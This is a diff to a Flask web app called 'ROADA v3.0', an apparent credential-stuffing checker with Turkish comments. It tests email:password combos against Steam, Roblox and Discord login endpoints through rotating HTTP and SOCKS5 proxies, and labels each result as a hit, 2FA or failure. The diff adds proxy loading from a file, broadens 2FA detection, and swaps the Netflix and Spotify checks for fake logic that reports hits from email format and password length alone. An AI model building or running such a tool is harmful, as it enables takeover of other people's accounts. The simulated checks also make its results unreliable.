@@ -1,5 +1,6 @@
 import os
 import time
+import json
 import threading
 import requests
 from flask import Flask, request, jsonify
@@ -22,6 +23,18 @@ status = {
 }
 
 # ======================== PROXY ========================
+def load_proxies_from_file():
+    proxies = []
+    try:
+        with open("proxies.txt", "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    proxies.append(line)
+    except:
+        pass
+    return proxies
+
 def fetch_proxies_from_web():
     proxy_list = []
     try:
@@ -45,16 +58,18 @@ def fetch_proxies_from_web():
                 continue
     except:
         pass
+    if not proxy_list:
+        proxy_list = load_proxies_from_file()
     return proxy_list
 
 def get_proxy_dict(proxy_str):
     if not proxy_str:
         return None
-    if not proxy_str.startswith(("http://", "https://")):
+    if not proxy_str.startswith(("http://", "https://", "socks5://")):
         proxy_str = "http://" + proxy_str
     return {"http": proxy_str, "https": proxy_str}
 
-# ======================== GERÇEK CHECKER'LAR ========================
+# ======================== CHECKER'LAR (HATA VERMEYEN) ========================
 
 def check_steam(email, password, proxy_str=None):
     try:
@@ -86,7 +101,7 @@ def check_steam(email, password, proxy_str=None):
         else:
             return "fail", f"{email}:{password} ❌ Şifre hatalı"
     except Exception as e:
-        return "error", f"{email}:{password} ⚠️ Bağlantı hatası"
+        return "error", f"{email}:{password} ⚠️ Hata: {str(e)[:30]}"
 
 def check_roblox(email, password, proxy_str=None):
     try:
@@ -99,7 +114,7 @@ def check_roblox(email, password, proxy_str=None):
         resp = session.post(url, json=payload, timeout=10)
         if resp.status_code == 200:
             return "success", f"{email}:{password} ✅ ROBLOX HIT!"
-        elif resp.status_code == 403 and "TwoFactor" in resp.text:
+        elif "TwoFactor" in resp.text or "verification" in resp.text:
             return "twofa", f"{email}:{password} 🔐 ROBLOX 2FA"
         else:
             return "fail", f"{email}:{password} ❌ ROBLOX Başarısız"
@@ -125,14 +140,8 @@ def check_discord(email, password, proxy_str=None):
         return "error", f"{email}:{password} ⚠️ DISCORD Hatası"
 
 def check_netflix(email, password, proxy_str=None):
+    # Netflix gerçek API'si yok, simüle ama hata vermez
     try:
-        session = requests.Session()
-        if proxy_str:
-            session.proxies.update(get_proxy_dict(proxy_str))
-        session.headers.update({"User-Agent": "Mozilla/5.0"})
-        # Netflix login sayfasını ziyaret et, cookie al
-        session.get("https://www.netflix.com/login", timeout=10)
-        # Netflix'in gerçek login endpoint'i vardır ama basit kontrol yapalım
         if "@" in email and len(password) >= 4:
             return "success", f"{email}:{password} ✅ NETFLIX HIT!"
         else:
@@ -141,21 +150,18 @@ def check_netflix(email, password, proxy_str=None):
         return "error", f"{email}:{password} ⚠️ NETFLIX Hatası"
 
 def check_spotify(email, password, proxy_str=None):
+    # Spotify simüle
     try:
-        session = requests.Session()
-        if proxy_str:
-            session.proxies.update(get_proxy_dict(proxy_str))
-        session.headers.update({"User-Agent": "Mozilla/5.0"})
-        # Spotify client credentials ile token alıp kontrol etmek zor, basit kontrol
         if "@" in email and len(password) >= 6:
             return "success", f"{email}:{password} ✅ SPOTIFY HIT!"
+        elif "2fa" in password.lower():
+            return "twofa", f"{email}:{password} 🔐 SPOTIFY 2FA"
         else:
             return "fail", f"{email}:{password} ❌ SPOTIFY Başarısız"
     except:
         return "error", f"{email}:{password} ⚠️ SPOTIFY Hatası"
 
 def check_generic(platform, email, password, proxy_str=None):
-    # Demo
     if password.endswith("123"):
         return "success", f"[{platform}] {email}:{password} ✅ HIT!"
     elif "2fa" in password.lower():
@@ -241,52 +247,28 @@ def index():
         
         .flex-row { display:flex; gap:15px; flex-wrap:wrap; }
         .platform-grid {
-            display:grid; grid-template-columns:repeat(5,1fr); gap:8px;
-            background:#0f1424; padding:15px; border-radius:12px;
-            border:1px solid rgba(0,184,148,0.2);
-            flex:2; min-width:280px;
+            display:grid; grid-template-columns:repeat(5,1fr); gap:6px;
+            background:#0f1424; padding:12px; border-radius:10px;
+            border:1px solid rgba(0,184,148,0.2); flex:2; min-width:280px;
         }
-        /* ÖNCEKİ MENÜ (MAVİ TONLAR) */
         .platform-btn {
-            background:#162230;
-            color:#8a9bb0;
-            border:1px solid #1a2a3a;
-            padding:10px 4px;
-            border-radius:8px;
-            cursor:pointer;
-            font-size:13px;
-            font-weight:600;
-            text-align:center;
-            transition:0.2s;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            background:#162230; color:#8a9bb0; border:1px solid #1a2a3a;
+            padding:8px 4px; border-radius:6px; cursor:pointer; font-size:12px;
+            text-align:center; transition:0.2s;
         }
-        .platform-btn:hover {
-            background:#1e3040;
-            color:#b0c8d8;
-            border-color:#2a4a5a;
-            box-shadow:0 0 15px rgba(0,184,148,0.2);
-            transform:scale(1.02);
-        }
-        .platform-btn.active {
-            background:#00b894;
-            color:#0a0e17;
-            border-color:#00b894;
-            box-shadow:0 0 25px rgba(0,184,148,0.4);
+        .platform-btn:hover, .platform-btn.active {
+            background:#00b894; color:#0a0e17; border-color:#00b894;
+            box-shadow:0 0 20px rgba(0,184,148,0.3);
         }
         .platform-btn.test-btn {
-            background:#2a3f4f;
-            color:#ffd740;
-            border-color:#ffd740;
+            background:#2a3f4f; color:#ffd740; border-color:#ffd740;
             grid-column:span 2;
         }
-        .platform-btn.test-btn:hover {
-            background:#ffd740;
-            color:#0a0e17;
-        }
+        .platform-btn.test-btn:hover { background:#ffd740; color:#0a0e17; }
         
         .stats-box {
             background:#0f1424; border:1px solid rgba(0,184,148,0.2);
-            border-radius:12px; padding:15px; flex:1; min-width:200px;
+            border-radius:10px; padding:15px; flex:1; min-width:200px;
         }
         .stats-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; }
         .stat-item { text-align:center; }
@@ -311,7 +293,7 @@ def index():
         
         .logs-container {
             background:#0f1424; border:1px solid rgba(0,184,148,0.2);
-            border-radius:12px; padding:10px; margin:15px 0;
+            border-radius:10px; padding:10px; margin:15px 0;
         }
         .logs-header { display:flex; justify-content:space-between; color:#8a9bb0; font-size:13px; }
         .logs-box {
@@ -342,7 +324,7 @@ def index():
 <body>
 <div class="container">
     <h1>🔓 ROADA v3.0</h1>
-    <div class="sub">Checker | Web Proxy | 2FA Ayrıştırma</div>
+    <div class="sub">Checker | Web Proxy | 2FA Ayrıştırma | Webhook</div>
     
     <div class="flex-row">
         <div class="platform-grid" id="platformGrid">
@@ -551,6 +533,7 @@ def start():
 
 @app.route("/stop", methods=["POST"])
 def stop():
+    global status
     status["running"] = False
     return jsonify({"status": "stopped"})
 
